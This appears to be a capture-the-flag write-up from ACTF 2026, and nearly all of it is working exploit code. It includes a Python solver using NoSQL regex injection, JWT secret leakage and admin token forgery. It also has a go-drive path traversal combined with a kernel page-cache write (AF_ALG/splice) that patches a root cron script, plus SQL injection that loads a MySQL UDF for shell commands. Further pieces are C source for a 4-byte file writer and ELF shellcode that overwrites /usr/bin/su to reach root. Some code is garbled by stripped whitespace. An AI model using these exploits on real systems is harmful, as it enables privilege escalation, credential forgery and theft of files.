{"id":"000000000000000000000000","username":"admin","role":"admin","iat": 1778386000,"exp": 1778472400}
import base64import hashlibimport hmacimport json
def b64url(data): returnbase64.urlsafe_b64encode(data).rstrip(b"=").decode()def sign_jwt(secret, payload): header = {"alg":"HS256","typ":"JWT"} signing_input =".".join([ b64url(json.dumps(header, separators=(",",":")).encode()), b64url(json.dumps(payload, separators=(",",":")).encode()), ]) sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest() returnf"{signing_input}.{b64url(sig)}"
<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:
xlink="http://www.w3.org/1999/xlink" width="1800"height="360"viewBox="40 40 420 35"> <rect x="-1000"y="-1000"width="5000"height="5000"fill="white"/> </svg>
import argparseimport base64import hashlibimport hmacimport jsonimport osimport reimport secretsimport subprocessimport time
from pathlib import Pathimport requestsHEX ="0123456789abcdef"def b64url(data): returnbase64.urlsafe_b64encode(data).rstrip(b"=").decode()def sign_jwt(secret, payload): header = {"alg":"HS256","typ":"JWT"} signing_input =".".join([ b64url(json.dumps(header, separators=(",",":")).encode()), b64url(json.dumps(payload, separators=(",",":")).encode()), ]) sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest() returnf"{signing_input}.{b64url(sig)}"def char_codes(value): return",".join(str(ord(c))forcinvalue)class Solver: def __init__(self, base_url, timeout=30, out_dir=None): self.base = base_url.rstrip("/") self.timeout = timeout self.session = requests.Session() self.session.headers.update({ "Connection":"close", "User-Agent":"aaa26-full-solver/1.0", }) suffix = secrets.token_hex(5) self.username = f"u{suffix}" self.email = f"{self.username}@example.com" self.password ="Passw0rd!" self.out_dir = Path(out_dir or os.getcwd()).resolve() self.out_dir.mkdir(parents=True, exist_ok=True) def request(self, method, path, session=None, **kwargs): kwargs.setdefault("timeout", self.timeout) url = f"{self.base}{path}" sess = session or self.session last_error = None forattemptinrange(1, 6): try: returnsess.request(method, url, **kwargs) 
except requests.RequestException as exc: last_error = exc print(f"[!] {method} {path} retry {attempt}: {exc}", flush=True) time.sleep(1.2 * attempt) raise RuntimeError(f"{method} {path} failed after retries: {last_error}") def register_and_login(self): r = self.request( "POST", "/register", data={"username": self.username,"email": self.email,"password": self.password}, allow_redirects=False, ) print(f"[*] registered {self.username}: HTTP {r.status_code}", flush=True) r = self.request( "POST", "/login", data={"username": self.username,"password": self.password}, allow_redirects=False, ) ifnot self.session.cookies.get("token"): raise RuntimeError(f"login failed: HTTP {r.status_code}") print("[*] logged in", flush=True) def upload_profile_with_reference(self, reference): profile = { "source":"External service record", "label":"Committee shadow slot", "committee": { "registration": { "reference": reference, "season":"AAA26", }, "desk":"overflow", }, } data = [ ("track","systems"), ("areas","systems"), ("areas","review process"), ("areas","artifact sanity"), ("score","100"), ("statement","I can review systems, review process, and artifact sanity."), ] files = {"profileFile": ("service.json", json.dumps(profile),"application/json")} r = self.request("POST","/reviewer/profile", data=data, files=files) if"Reviewer profile could not be imported."inr.text: raise RuntimeError("profile import failed") def submit_profile_once(self): r = self.request("POST","/reviewer/profile/submit") if"Reviewer profile submitted for committee service sync."notinr.text and"Submitted"notinr.text: raise RuntimeError("profile submit did not reach Submitted state") print("[*] reviewer profile submitted", flush=True) def sync_matches(self): r = self.request("POST","/reviewer/profile/service-sync") text = re.sub(r"s+"," ", r.text) if"Committee service desk has an available assignment slot."intext: returnTrue if"Committee service desk has not found an assignment slot yet."intext: returnFalse raise RuntimeError(f"unexpected sync response: {text[:
300]}") def invite_oracle(self, regex): forattemptinrange(1, 5): try: self.upload_profile_with_reference({"$regex": regex}) returnself.sync_matches() 
except Exception as exc: print(f"[!] invite oracle retry {attempt} for {regex!r}: {exc}", flush=True) time.sleep(attempt) raise RuntimeError(f"invite oracle failed for {regex!r}") def ensure_unused_invite_exists(self): self.upload_profile_with_reference({"$ne": None}) ifnot self.sync_matches(): raise RuntimeError("no unused reviewer invite matched; reset the local instance and rerun") print("[*] unused reviewer invite is present", flush=True) def leak_invite_code(self): code ="" forposinrange(36): candidates = list(HEX) whilelen(candidates) > 1: half = (len(candidates) + 1) // 2 left = candidates[:
half] regex = f"^{code}[{''.join(left)}]" candidates = leftifself.invite_oracle(regex)elsecandidates[half:] code += candidates[0] ifnot self.invite_oracle(f"^{code}"): raise RuntimeError(f"invite prefix verification failed at {code}") print(f"[+] invite code {pos + 1:
02d}/36: {code}", flush=True) returncode def claim_reviewer(self, code): r = self.request( "POST", "/reviewer/claim", data={"email":"committee-shadow@aaa26.big1","code": code}, allow_redirects=False, ) print(f"[*] claim reviewer: HTTP {r.status_code} -> {r.headers.get('location')}", flush=True) r = self.request("GET","/reviewer/assignments", allow_redirects=False) ifr.status_code != 200 or"Review Assignments"notinr.text: raise RuntimeError(f"reviewer access not confirmed: HTTP {r.status_code}") print("[+] reviewer access confirmed", flush=True) def reviewer_filter_hit(self, expression): r = self.request("POST","/api/reviewer/filter", json={"expression": expression}) data = r.json() ifnot data.get("ok"): raise RuntimeError(f"reviewer filter rejected expression: {data}") returnint(data.get("count", 0)) > 0 def jwt_prefix_oracle(self, prefix, charset=None, loops=1): p_codes = char_codes(prefix) ifcharset is None: test="m[j].startsWith(p)" else: c_codes = char_codes(charset) test="m[j].startsWith(p)&&cs.includes(m[j][p.length])" expression = ( "(()=>{" f"let p=String.fromCharCode({p_codes});" f"let cs=String.fromCharCode({c_codes if charset is not None else ''});" f"for(let i=0;i<{loops};i++){{" "let x=Buffer.from('X');" "let s=Buffer.from(x.buffer).toString('latin1');" "let m=s.match(/aaa26_[0-9a-f]{48}/g)||[];" f"for(let j=0;j<m.length;j++){{if({test})return true;}}" "}" "return false})()" ) returnself.reviewer_filter_hit(expression) def leak_jwt_secret(self): prefix ="aaa26_" ifnot self.jwt_prefix_oracle(prefix, loops=2): raise RuntimeError("JWT secret prefix was not visible in Buffer slab") print("[*] JWT secret prefix visible through Buffer slab", flush=True) whilelen(prefix) < len("aaa26_") + 48: candidates = list(HEX) whilelen(candidates) > 1: half = (len(candidates) + 1) // 2 left = candidates[:
half] candidates = leftifself.jwt_prefix_oracle(prefix,"".join(left), loops=2)elsecandidates[half:] prefix += candidates[0] print(f"[+] jwt secret {len(prefix) - 6:
02d}/48: {prefix}", flush=True) returnprefix def create_paper(self): pdf = ( b"%PDF-1.3n" b"1 0 obj<</Type/Catalog/Pages 2 0 R>>endobjn" b"2 0 obj<</Type/Pages/Count 0>>endobjn" b"trailer<</Root 1 0 R>>n%%EOFn" ) r = self.request( "POST", "/papers/new", data={ "title": f"Camera Ready Exploit {secrets.token_hex(3)}", "abstract":"A short paper about proceedings preparation.", "authors":"Exploit Author, exploit@example.com", "topics":"systems", }, files={"pdf": ("draft.pdf", pdf,"application/pdf")}, allow_redirects=False, ) location = r.headers.get("location","") match = re.search(r"/papers/([0-9a-f]{24})/view", location) ifnot match: raise RuntimeError(f"paper creation failed: HTTP {r.status_code}, location={location!r}") paper_id = match.group(1) print(f"[+] paper created: {paper_id}", flush=True) returnpaper_id def forge_admin_session(self, secret): now = int(time.time()) token = sign_jwt(secret, { "id":"000000000000000000000000", "username":"admin", "role":"admin", "iat": now, "exp": now + 24 * 60 * 60, }) admin = requests.Session() admin.headers.update({"Connection":"close","User-Agent":"aaa26-full-solver/1.0"}) host = re.sub(r"^https?://","", self.base).split("/")[0].split(":")[0] admin.cookies.set("token", token, domain=host, path="/") returnadmin def accept_paper_as_admin(self, admin, paper_id): r = self.request( "POST", f"/admin/papers/{paper_id}/status", session=admin, data={"status":"Accepted"}, allow_redirects=False, ) ifr.status_code notin(302, 303): raise RuntimeError(f"admin accept failed: HTTP {r.status_code}, {r.text[:
120]}") print("[+] forged admin accepted the paper", flush=True) def camera_ready_svg(self, viewbox_width): returnf'''<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:
xlink="http://www.w3.org/1999/xlink" width="1800" height="360" viewBox="40 40 {viewbox_width} 35"> <rect x="-1000" y="-1000" width="5000" height="5000" fill="white"/> </svg>''' def upload_camera_ready(self, paper_id, width): svg = self.camera_ready_svg(width) r = self.request( "POST", f"/papers/{paper_id}/camera-ready", files={"cameraReadyPdf": ("camera-ready.pdf", svg,"application/pdf")}, allow_redirects=False, ) ifr.status_code notin(302, 303): raise RuntimeError(f"camera-ready upload failed: HTTP {r.status_code}, {r.text[:
120]}") view = self.request("GET", f"/papers/{paper_id}/view").text match = re.search(r'(/public/camera-ready/thumbs/[^"']+)', view) if not match: raise RuntimeError("thumbnail path not found after camera-ready upload") thumb_path = match.group(1) image = self.request("GET", thumb_path).content out = self.out_dir / f"aaa26_thumb_w{width}.png" out.write_bytes(image) print(f"[*] thumbnail w={width}: {thumb_path} -> {out}", flush=True) return out, thumb_path def ocr_flag(self, image_path): try: from PIL import Image, ImageOps 
except Exception: return "" image = Image.open(image_path).convert("L") bbox = ImageOps.invert(image).getbbox() if bbox: x0, y0, x1, y1 = bbox margin = 10 image = image.crop(( max(0, x0 - margin), max(0, y0 - margin), min(image.width, x1 + margin), min(image.height, y1 + margin), )) image = image.resize((image.width * 5, image.height * 5), Image.Resampling.LANCZOS) image = image.point(lambda p: 0 if p < 180 else 255) prepared = image_path.with_suffix(".prep.png") image.save(prepared) cmd = [ "tesseract", str(prepared), "stdout", "--psm", "7", "-c", "tessedit_char_whitelist=flag{}()ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-", ] try: raw = subprocess.run(cmd, capture_output=True, text=True, timeout=10).stdout.strip() 
except Exception: return "" cleaned = re.sub(r"s+", "", raw).replace("(", "{").replace(")", "}") match = re.search(r"flag{[^}]{3,}}", cleaned) return match.group(0) if match else cleaned def read_flag_via_camera_ready(self, paper_id): seen = [] for width in (240, 320, 360, 380, 420): image_path, thumb_path = self.upload_camera_ready(paper_id, width) text = self.ocr_flag(image_path) seen.append((width, text, image_path, thumb_path)) if re.fullmatch(r"flag{[^}]+}", text or ""): print(f"[+] OCR flag from width {width}: {text}", flush=True) return text print("[!] OCR did not confidently recover a flag. Attempts:", flush=True) for width, text, image_path, thumb_path in seen: print(f" width={width} ocr={text!r} image={image_path} url={self.base}{thumb_path}", flush=True) return "" def run(self): self.register_and_login() self.upload_profile_with_reference({"$regex": "^"}) self.submit_profile_once() self.ensure_unused_invite_exists() invite_code = self.leak_invite_code() print(f"[+] reviewer invite code: {invite_code}", flush=True) self.claim_reviewer(invite_code) jwt_secret = self.leak_jwt_secret() print(f"[+] jwt secret: {jwt_secret}", flush=True) paper_id = self.create_paper() admin = self.forge_admin_session(jwt_secret) self.accept_paper_as_admin(admin, paper_id) flag = self.read_flag_via_camera_ready(paper_id) if flag: print(f"[+] FLAG: {flag}", flush=True)def main(): parser = argparse.ArgumentParser(description="AAA26 Big-1 full local exploit") parser.add_argument("base_url", help="target base URL, e.g. http://127.0.0.1:
62303") parser.add_argument("--timeout", type=int, default=30) parser.add_argument("--out-dir", default="/Users/y7/Downloads/mid", help="where thumbnails are saved") args = parser.parse_args() Solver(args.base_url, timeout=args.timeout, out_dir=args.out_dir).run()if __name__ == "__main__": main()
chown root:
root /usr/bin/base64chmod 4755 /usr/bin/base64
def run_driver(program, argument): pid = os.posix_spawn(program, [program, argument], os.environ, file_actions=file_actions)
ifscope.get("mode") =="legacy-rank": returnstr(scope.get("expr","ticket_no"))[:
240]
public_view = json.loads(payload_text, object_pairs_hook=first_wins_object) # 验证用，第一个值优先render_view = json.loads(payload_text) # 实际用，最后一个值优先（Python 默认行为）
{"tariffScope": { "mode":"legacy-rank", "expr":"IF(ASCII(SUBSTRING((SELECT claim_salt FROM station_claim_artifacts WHERE ...),{pos},1))>{mid},ticket_no,passenger)" }}
digest = sha256(f"{order_id}|G7608|HGH|T-HGH-7608-019|{claim_salt}")proof = f"CP-{claim_salt}-{digest[:12]}"
{"stationCode":"HGH","channel":"fare-desk","lineItems": { "role":"settlement-layout", "reason":"FARE-91", "layout":"folio-grid-27", "device":"PR-HGH-042" }}
X-Desk-Lane: delta-window-27X-Board-Window: seat-window-e27X-Desk-Key-Id: POL-HGH-TRUSTEDX-Desk-Key: delta-window-27
INSERT INTO bureau_layout_cells VALUES ('HGH','folio-grid-27','receipt','service-device','PR-HGH-042', 1, ...)
{"batchId":"...","orderId":"...","stationCode":"HGH","templateDigest":"...","routeName":"delta-window-27","ledgerRef":"...","printProfile":"counter-copy", ← first_wins 看到，用于验证"printer":"thermal-standard", ← first_wins 看到，用于验证"printProfile":"clearing-batch", ← last_wins 看到，用于 print_plan"printer":"line-printer", ← last_wins 看到，用于 print_plan"driverProgram":"/usr/bin/base64","driverArgument":"/flag"}
admin / 123456
esc/tmpesc/app/config.ymlesc/usr/lib/php/sessionclean
/usr/bin/python3 /tmp/p.py
/usr/lib/php/sessionclean
#!/bin/shcp /root/0-0/flag /tmp/FLAGchmod 0644 /tmp/FLAGexit0
sessionclean patched! len=160waitcronthenread/tmp/FLAG
esc/tmp/FLAG
#!/usr/bin/env python3
# -*- coding: utf-8 -*-import argparseimport ioimport reimport sysimport timeimport urllib.parseimport zipfileimport requestsDEFAULT_BASE ="http://web-4e397b987b.adworld.xctf.org.cn:80/new"PATCHER = r"""#!/usr/bin/env python3import os as g, socket as s, sys, tracebackAF_ALG=38; SOL_ALG=279PAYLOAD=(b"#!/bin/shn" b"cp /root/0-0/flag /tmp/FLAGn" b"chmod 0644 /tmp/FLAGn" b"exit 0n")PAYLOAD = PAYLOAD + b" "*(160-len(PAYLOAD))def d(x):
returnbytes.fromhex(x)def write4(fd, off, chunk): a=s.socket(AF_ALG,5,0) a.bind(("aead","authencesn(hmac(sha256),cbc(aes))")) a.setsockopt(SOL_ALG,1,d('0800010000000010'+'0'*64)) a.setsockopt(SOL_ALG,5,None,4) u,_=a.accept(); z=b'x00'; n=off+4 u.sendmsg([b'A'*4+chunk],[(SOL_ALG,3,z*4),(SOL_ALG,2,b'x10'+z*19),(SOL_ALG,4,b'x08'+z*3)],32768) r,w=g.pipe() g.splice(fd,w,n,offset_src=0) g.splice(r,u.fileno(),n) try: u.recv(8+off) 
except Exception: pass forxin(r,w): try: g.close(x) 
except Exception: pass try: u.close(); a.close() 
except Exception: passwith open('/tmp/EXP_LOG','w') aslog: try: log.write('start uid=%d euid=%d len=%dn'% (g.getuid(), g.geteuid(), len(PAYLOAD))); log.flush() fd=g.open('/usr/lib/php/sessionclean',0) try: foriinrange(0,len(PAYLOAD),4): write4(fd,i,PAYLOAD[i:i+4]) finally: g.close(fd) log.write('sessionclean patched! len=%dn'% len(PAYLOAD)) log.write('wait cron then read /tmp/FLAGn') 
except Exception: log.write(traceback.format_exc())sys.stdout.buffer.write(b"xffxd8xffxd9")"""class GD: def __init__(self, base, user, password): self.base = base.rstrip("/") self.s = requests.Session() self.h = {} r = self.s.post(self.base + "/auth/init", timeout=10) r.raise_for_status() self.h = {"Authorization": r.json()["token"]} r = self.s.post( self.base + "/auth/login", headers=self.h, json={"username": user, "password": password}, timeout=10, ) if r.status_code != 200: raise SystemExit(f"login failed: {r.status_code} {r.text[:
200]}") @staticmethod def q(path): return urllib.parse.quote(path, safe="/") def ensure_esc(self): r = self.s.get(self.base + "/admin/drives", headers=self.h, timeout=10) r.raise_for_status() if '"esc"' not in r.text: r = self.s.post( self.base + "/admin/drive", headers=self.h, timeout=10, json={ "name": "esc", "enabled": True, "type": "fs", "config": '{"path":"../../../"}', }, ) r.raise_for_status() r = self.s.post( self.base + "/admin/drives/reload", headers=self.h, timeout=10 ) r.raise_for_status() def put(self, path, data): r = self.s.put( self.base + "/content/" + self.q(path), headers={**self.h, "Content-Type": "application/octet-stream"}, params={"override": "1"}, data=data, timeout=20, ) if r.status_code != 200: raise SystemExit(f"PUT {path} failed: {r.status_code} {r.text[:
300]}") try: return r.json().get("result", {}) 
except Exception: return {} def access_key(self, path): parent = path.rsplit("/", 1)[0] r = self.s.get( self.base + "/entries/" + self.q(parent), headers=self.h, timeout=10 ) r.raise_for_status() for e in r.json(): if e.get("path") == path: return e.get("meta", {}).get("accessKey") raise SystemExit(f"cannot find accessKeyfor{path}") def trigger_thumbnail(self, path, key): r = self.s.get( self.base + "/thumbnail/" + self.q(path), headers=self.h, params={"_k": key}, timeout=60, ) if r.status_code != 200 or r.content[:2] != b"xffxd8": raise SystemExit( f'thumbnail trigger failed: {r.status_code} {r.headers.get("content-type")} {r.text[:
300]!r}' ) def zip_read(self, path): r = self.s.post( self.base + "/zip", headers=self.h, data={"files": path}, timeout=20 ) if r.status_code != 200: return None try: z = zipfile.ZipFile(io.BytesIO(r.content)) names = z.namelist() if not names: return None return z.read(names[0]) 
except Exception: return None
def main(): ap = argparse.ArgumentParser(description="ACTF2026 web minimal exploit") ap.add_argument( "base", nargs="?", default=DEFAULT_BASE, help="go-drive base url, default: %(default)s", ) ap.add_argument("-u", "--user", default="admin") ap.add_argument("-p", "--password", default="123456") ap.add_argument( "-t", "--timeout", type=int, default=2400, help="seconds to poll /tmp/FLAG" ) args = ap.parse_args() gd = GD(args.base, args.user, args.password) print("[+] loggedin") gd.ensure_esc() print("[+] esc drive ready") gd.put("esc/tmp/p.py", PATCHER.encode()) gd.s.put( gd.base + "/admin/options", headers=gd.h, json={"thumbnail.handlersMapping": "exploit:**"}, timeout=10, ) print("[+] uploaded /tmp/p.py") trig = f"esc/tmp/trig{int(time.time()*1000)}.cgi" res = gd.put(trig, b"x") key = res.get("meta", {}).get("accessKey") or gd.access_key(trig) gd.trigger_thumbnail(trig, key) print("[+] CVE patcher triggered; waitingforroot cron to run sessionclean") end = time.time() + args.timeout while time.time() < end: b = gd.zip_read("esc/tmp/FLAG") if b: text = b.decode("utf-8", "replace") m = re.search(r"[A-Z]+CTF{[^}n]+}", text) if m: print("[+] flag:", m.group(0)) return print(text) return log = gd.zip_read("esc/tmp/EXP_LOG") if log: sys.stdout.write( "r" + log.decode("utf-8", "replace").splitlines()[-1][:80] ) sys.stdout.flush() time.sleep(5) raise SystemExit("n[-] timeout; check esc/tmp/EXP_LOG and cron schedule")if __name__ == "__main__": main()
database()user()
1;dosleep(1)
1;execute immediate 0x73656c65637420313233
[116 101 115 116 100 98]
dropfunctionifexists rf;createfunctionrf(p text) returns longtext deterministicreturnload_file(p);dropfunctionifexists lenf;createfunctionlenf(p text) returnsintegerdeterministicreturnlength(load_file(p));dropfunctionifexists hx;createfunctionhx(p text,ointeger,linteger) returns longtext deterministicreturnhex(substr(load_file(p),o,l));
rf('/etc/passwd')rf('/flag')
-rw------- 1 root root 49 ... /flag
SELECT 0x<so文件hex> INTO DUMPFILE'/usr/lib/mysql/plugin/libmse9.so'
DROP FUNCTION IF EXISTS sysx;CREATE FUNCTION sysx RETURNS INTEGER SONAME'libmse9.so';
sysx('sh -c ...')
uid=100(mysql) gid=101(mysql) groups=101(mysql)
PID 1 root /usr/local/bin/99820119_myappPID 42 root /bin/sh /usr/bin/mysqld_safePID 169 mysql /usr/sbin/mariadbd ...
/bin/sh -c <arg>
Linux ... 4.18.0-240.el8.x86_64
    #define_GNU_SOURCE#include<errno.h>#include<fcntl.h>#include<linux/if_alg.h>#include<stdint.h>#include<stdio.h>#include<stdlib.h>#include<string.h>#include<sys/socket.h>#include<sys/types.h>#include#ifndefSOL_ALG#defineSOL_ALG 279#endifstatic void build_keyblob(unsigned char out[56]) { memset(out, 0, 56); out[0] = 0x08; out[1] = 0x00; out[2] = 0x01; out[3] = 0x00; out[7] = 0x10;}static int write4(const char *path, off_t file_offset, const unsigned char data[4]) { int fd_target = -1; int master = -1; int op = -1; int pr = -1; int pw = -1; int rc = -1; unsigned char keyblob[56]; unsigned char aad[8]; unsigned char ivmsg[20]; unsigned char assoclen[4]; unsigned char recvbuf[64]; unsigned char cachebuf[4096]; unsigned char control[CMSG_SPACE(sizeof(uint32_t)) + CMSG_SPACE(sizeof(ivmsg)) + CMSG_SPACE(sizeof(assoclen))]; struct sockaddr_alg sa; struct iovec iov; struct msghdr msg; struct cmsghdr *cmsg; loff_t src_off = file_offset; uint32_t alg_op = 0; ssize_t n; fd_target = open(path, O_RDONLY); if(fd_target < 0) { perror("open"); goto out; } if(pread(fd_target, cachebuf, sizeof(cachebuf), 0) < 0) { perror("pread"); goto out; } memset(&sa, 0, sizeof(sa)); sa.salg_family = AF_ALG; strcpy((char *)sa.salg_type,"aead"); strcpy((char *)sa.salg_name,"authencesn(hmac(sha256),cbc(aes))"); master = socket(AF_ALG, SOCK_SEQPACKET, 0); if(master < 0) { perror("socket"); goto out; } if(bind(master, (struct sockaddr *)&sa, sizeof(sa)) != 0) { perror("bind"); goto out; } build_keyblob(keyblob); if(setsockopt(master, SOL_ALG, ALG_SET_KEY, keyblob, sizeof(keyblob)) != 0) { perror("setsockopt(ALG_SET_KEY)"); goto out; } op = accept(master, NULL, 0); if(op < 0) { perror("accept"); goto out; } memset(aad, 0, sizeof(aad)); memcpy(aad + 4, data, 4); memset(ivmsg, 0, sizeof(ivmsg)); ivmsg[0] = 0x10; assoclen[0] = 0x08; assoclen[1] = 0x00; assoclen[2] = 0x00; assoclen[3] = 0x00; memset(control, 0, sizeof(control)); memset(&msg, 0, sizeof(msg)); iov.iov_base = aad; iov.iov_len = sizeof(aad); msg.msg_iov = &iov; msg.msg_iovlen = 1; msg.msg_control = control; msg.msg_controllen = sizeof(control); cmsg = CMSG_FIRSTHDR(&msg); cmsg->cmsg_level = SOL_ALG; cmsg->cmsg_type = ALG_SET_OP; cmsg->cmsg_len = CMSG_LEN(sizeof(alg_op)); memcpy(CMSG_DATA(cmsg), &alg_op, sizeof(alg_op)); cmsg = CMSG_NXTHDR(&msg, cmsg); cmsg->cmsg_level = SOL_ALG; cmsg->cmsg_type = ALG_SET_IV; cmsg->cmsg_len = CMSG_LEN(sizeof(ivmsg)); memcpy(CMSG_DATA(cmsg), ivmsg, sizeof(ivmsg)); cmsg = CMSG_NXTHDR(&msg, cmsg); cmsg->cmsg_level = SOL_ALG; cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN; cmsg->cmsg_len = CMSG_LEN(sizeof(assoclen)); memcpy(CMSG_DATA(cmsg), assoclen, sizeof(assoclen)); if(sendmsg(op, &msg, MSG_MORE) < 0) { perror("sendmsg"); goto out; } { int fds[2]; if(pipe(fds) != 0) { perror("pipe"); goto out; } pr = fds[0]; pw = fds[1]; } n = splice(fd_target, &src_off, pw, NULL, 32, 0); if(n != 32) { if(n < 0) { perror("splice(file->pipe)"); }else{ fprintf(stderr,"splice(file->pipe) short: %zdn", n); } goto out; } n = splice(pr, NULL, op, NULL, 32, 0); if(n != 32) { if(n < 0) { perror("splice(pipe->socket)"); }else{ fprintf(stderr,"splice(pipe->socket) short: %zdn", n); } goto out; } n = recv(op, recvbuf, sizeof(recvbuf), 0); if(n < 0 && errno != EBADMSG && errno != EINVAL) { perror("recv"); goto out; } rc = 0;out: if(pr >= 0) { close(pr); } if(pw >= 0) { close(pw); } if(op >= 0) { close(op); } if(master >= 0) { close(master); } if(fd_target >= 0) { close(fd_target); } returnrc;}int main(int argc, char **argv) { unsigned char bytes[4]; char *end = NULL; long long off; int i; if(argc != 4) { fprintf(stderr,"usage: %s  <offset> <4-byte-ascii|8-hex-digits>n", argv[0]); return2; } off = strtoll(argv[2], &end, 0); if(end == NULL || *end !=' '|| off < 0) { fprintf(stderr,"invalid offset: %sn", argv[2]); return2; } if(strlen(argv[3]) == 4) { memcpy(bytes, argv[3], 4); }elseif(strlen(argv[3]) == 8) { for(i = 0; i < 4; i++) { char tmp[3]; tmp[0] = argv[3][i * 2]; tmp[1] = argv[3][i * 2 + 1]; tmp[2] =' '; bytes[i] = (unsigned char)strtoul(tmp, &end, 16); if(end == NULL || *end !=' ') { fprintf(stderr,"invalid hex byte: %sn", tmp); return2; } } }else{ fprintf(stderr,"third argument must be 4 ASCII bytes or 8 hex digitsn"); return2; } if(write4(argv[1], (off_t)off, bytes) != 0) { return1; } return0;}
gcc -O2 -static -s -o cfw cf_write4.c
01234567890123456789...
/tmp/cfw /tmp/t2 4 WXYZ
0123WXYZ890123456789...
/tmp/cfw
foroffinrange(0, len(stub), 4): cmds.append(f"/tmp/cfw /usr/bin/su {off} {stub[off:
off+4].hex()}")
printf'idncat /flagn'| /usr/bin/su
uid=0(root) gid=101(mysql) groups=101(mysql)ACTF{y0u1_sqI_Y0ur_Go!!!!!_dxqmcFIr4ZCpo5OeNqSL}
import htmlimport pathlibimport reimport requestsimport shlexBASE ="http://web-fbc3e8ca0f.adworld.xctf.org.cn:80"class Exploit: def __init__(self, base: str): self.base = base.rstrip("/") self.calc = self.base +"/calc" self.s = requests.Session() def _extract(self, text: str) -> str: m = re.search(r'(.*?)', text, re.S) ifm: return"ERR:"+ html.unescape(re.sub(r"<.*?>","", m.group(1))).strip() m = re.search(r"<li>(.*?)</li>", text, re.S) ifnot m: return"NOMATCH" raw = html.unescape(re.sub(r"<.*?>","", m.group(1))).strip() return"ROW:"+ raw def decode_value(self, row: str) -> str: ifrow.startswith("ERR:") or row =="NOMATCH": returnrow raw = row[4:] if": "inraw: _, value = raw.split(": ", 1) else: value = raw value = value.strip() ifvalue =="<nil>": return"" ifvalue.startswith("[") and value.endswith("]"): body = value[1:-1].strip() returnbytes(int(x)forxinbody.split()).decode("utf-8","replace")ifbodyelse"" returnvalue def expr(self, expression: str, timeout: int = 60) -> str: r = self.s.post(self.calc, data={"expression": expression}, timeout=timeout) returnself._extract(r.text) def exec_sql(self, sql: str, timeout: int = 60) -> str: returnself.expr("1;execute immediate 0x"+ sql.encode().hex(), timeout=timeout) def read_file(self, path: str) -> str: returnself.decode_value(self.expr(f"rf('{path}')")) def ensure_helpers(self) -> None: stmts = [ "drop function if exists rf", "create function rf(p text) returns longtext deterministic return load_file(p)", "drop function if exists lenf", "create function lenf(p text) returns integer deterministic return length(load_file(p))", "drop function if exists hx", "create function hx(p text,o integer,l integer) returns longtext deterministic return hex(substr(load_file(p),o,l))", ] forstmtinstmts: self.exec_sql(stmt) def upload_blob(self, local_path: str, remote_path: str, timeout: int = 240) -> None: blob = pathlib.Path(local_path).read_bytes().hex() self.exec_sql(f"select 0x{blob} into dumpfile '{remote_path}'", timeout=timeout) def run_cmd(self, cmd: str, out: str ="/tmp/o", timeout: int = 240) -> str: payload = f"{{ {cmd}; }} >{out} 2>&1; chmod 644 {out}" wrapped ="sh -c "+ shlex.quote(payload) self.expr("sysx(0x"+ wrapped.encode().hex() +")", timeout=timeout) returnself.read_file(out)x = Exploit(BASE)x.ensure_helpers()
# upload UDF and register sysxx.upload_blob("libmse9.so","/usr/lib/mysql/plugin/libmse9.so")x.exec_sql("drop function if exists sysx")x.exec_sql("create function sysx returns integer soname 'libmse9.so'")
# upload Copy Fail 4-byte writerx.upload_blob("cfw","/tmp/cfw")
# minimal ELF stub: setuid(0) + execve('/bin/sh')stub = bytes.fromhex( "7f454c4602010100000000000000000002003e00010000007800400000000000" "4000000000000000000000000000000000000000400038000100000000000000" "01000000050000000000000000000000000040000000000000004000000000009e" "000000000000009e00000000000000001000000000000031c031ffb0690f05488d" "3d0f00000031f66a3b58990f0531ff6a3c580f052f62696e2f7368000000")cmds = ["chmod 755 /tmp/cfw"]foroffinrange(0, len(stub), 4): cmds.append(f"/tmp/cfw /usr/bin/su {off} {stub[off:
off+4].hex()}")cmds.append("printf 'id\ncat /flag\n' | /usr/bin/su")print(x.run_cmd("; ".join(cmds), out="/tmp/final"))
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778559186-wxsync-2026-05-ae1af45a5c88e9963491077eb6cdd45e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778559188-wxsync-2026-05-b8f6bf4b0ea339e8a47d1cd3c02ef944.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778559190-wxsync-2026-05-634f2b7229d5301fad73be61f814082f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778559192-wxsync-2026-05-18c4eead9011614511a822342a053491.png)